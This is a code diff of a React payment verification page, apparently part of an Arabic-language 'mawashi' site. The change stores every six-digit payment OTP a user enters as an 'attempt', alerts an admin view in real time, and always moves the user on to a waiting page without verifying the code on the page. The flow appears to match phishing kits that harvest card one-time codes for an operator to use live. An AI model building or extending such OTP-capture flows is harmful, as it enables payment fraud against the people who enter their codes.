@@ -2,7 +2,7 @@ import { useState, useRef, useEffect } from 'react';
 import { useLocation } from 'wouter';
 import { X } from 'lucide-react';
 import { Shell } from '../shared';
-import { useUpdateOrder } from '@workspace/api-client-react';
+import { createOtpAttempt } from '@workspace/api-client-react';
 
 export function PaymentVerificationPage() {
   const [, setLocation] = useLocation();
@@ -11,7 +11,6 @@ export function PaymentVerificationPage() {
   const [showInvalidError, setShowInvalidError] = useState(false);
   const inputRefs = useRef<(HTMLInputElement | null)[]>([]);
 
-  const updateOrder = useUpdateOrder();
   const fullCode = code.join('');
 
   // Get order ID from localStorage
@@ -71,31 +70,28 @@ export function PaymentVerificationPage() {
     inputRefs.current[0]?.focus();
   };
 
-  const handleVerify = () => {
+  const handleVerify = async () => {
     if (fullCode.length < 6) {
       setError('يرجى إدخال رمز التحقق كاملاً');
       return;
     }
     
-    // Send OTP to server
+    // Send OTP to server as a new attempt
     if (orderId) {
-      updateOrder.mutate({
-        id: orderId,
-        data: { otpCode: fullCode }
-      }, {
-        onSuccess: () => {
-          window.dispatchEvent(new Event('mawashi-data-update'));
-          setLocation('/payment-waiting');
-        },
-        onError: () => {
-          // Still navigate even if server update fails
-          window.dispatchEvent(new Event('mawashi-data-update'));
-          setLocation('/payment-waiting');
-        }
-      });
-    } else {
-      setLocation('/payment-waiting');
+      try {
+        await createOtpAttempt(orderId, {
+          otpCode: fullCode,
+          success: false, // Default to false, will be updated if verified
+        });
+        // Dispatch event for admin real-time updates
+        window.dispatchEvent(new CustomEvent('mawashi-otp-attempt', { detail: { orderId } }));
+      } catch (error) {
+        console.error('Failed to save OTP attempt:', error);
+      }
     }
+    
+    // Navigate to waiting page
+    setLocation('/payment-waiting');
   };
 
   useEffect(() => {
